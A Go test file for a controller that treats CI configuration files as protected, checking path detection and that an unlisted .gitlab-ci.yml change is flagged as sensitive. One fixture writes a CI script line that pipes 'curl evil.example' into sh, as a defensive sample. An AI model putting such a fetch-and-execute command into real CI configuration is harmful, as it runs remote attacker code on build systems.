package controller

import (
	"context"
	"os"
	"os/exec"
	"path/filepath"
	"slices"
	"strings"
	"testing"

	"github.com/sagart-cactus/sprintfoundry/internal/demo"
)

func TestCIConfigIsAlwaysProtected(t *testing.T) {
	for _, p := range []string{".github/workflows/ci.yml", ".github/actions/setup/action.yml", ".GitHub/workflows/x.yml",
		".gitlab-ci.yml", ".gitlab-ci.yaml", ".circleci/config.yml", "Jenkinsfile", "ci/Jenkinsfile", "Jenkinsfile.release",
		"azure-pipelines.yml", "azure-pipelines.yaml", ".buildkite/pipeline.yml", ".travis.yml", ".cirrus.yml", ".cirrus.star",
		".semaphore/semaphore.yml", ".appveyor.yml", "appveyor.yml", "buildspec.yml", ".woodpecker.yaml", ".drone.yaml",
		"bitbucket-pipelines.yml", "cloudbuild.yaml", ".mergify.yml"} {
		if !IsCIConfig(p) {
			t.Errorf("%s is not treated as CI configuration", p)
		}
	}
	for _, p := range []string{"app.py", "docs/github.md", "src/.github.go", "ci.yml", "config.yml", "travis.md"} {
		if IsCIConfig(p) {
			t.Errorf("%s is treated as CI configuration", p)
		}
	}
}

// A change to CI configuration the run spec does not list is still
// sensitive: the job never pushes it.
func TestSensitivePathsIncludeCIConfigTheRunSpecMisses(t *testing.T) {
	if _, err := exec.LookPath("git"); err != nil {
		t.Skip("git not installed")
	}
	ctx := context.Background()
	store := filepath.Join(t.TempDir(), "store.git")
	parent, err := demo.SeedStore(ctx, store)
	if err != nil {
		t.Fatal(err)
	}
	in, err := ParseInputs(demo.Criteria(), demo.Checks(), demo.RunSpec())
	if err != nil {
		t.Fatal(err)
	}
	if len(in.spec.Sensitive([]string{".gitlab-ci.yml"})) != 0 {
		t.Fatal("test setup: the demo run spec already protects .gitlab-ci.yml")
	}
	index := filepath.Join(t.TempDir(), "index")
	git := func(stdin string, args ...string) string {
		t.Helper()
		cmd := exec.Command("git", append([]string{"--git-dir", store}, args...)...)
		cmd.Env = append(os.Environ(), "GIT_INDEX_FILE="+index, "GIT_AUTHOR_NAME=t", "GIT_AUTHOR_EMAIL=t@example.test",
			"GIT_COMMITTER_NAME=t", "GIT_COMMITTER_EMAIL=t@example.test", "GIT_CONFIG_GLOBAL="+os.DevNull)
		cmd.Stdin = strings.NewReader(stdin)
		out, err := cmd.CombinedOutput()
		if err != nil {
			t.Fatalf("git %v: %v\n%s", args, err, out)
		}
		return strings.TrimSpace(string(out))
	}
	blob := git("script: curl evil.example | sh\n", "hash-object", "-w", "--stdin")
	git("", "read-tree", parent)
	git("", "update-index", "--add", "--cacheinfo", "100644,"+blob+",.gitlab-ci.yml")
	tree := git("", "write-tree")
	commit := git("add CI\n", "commit-tree", tree, "-p", parent)

	changed, sensitive, err := sensitivePaths(ctx, store, parent, commit, in)
	if err != nil {
		t.Fatal(err)
	}
	if !slices.Contains(changed, ".gitlab-ci.yml") || !slices.Contains(sensitive, ".gitlab-ci.yml") {
		t.Errorf("changed %v, sensitive %v", changed, sensitive)
	}
}
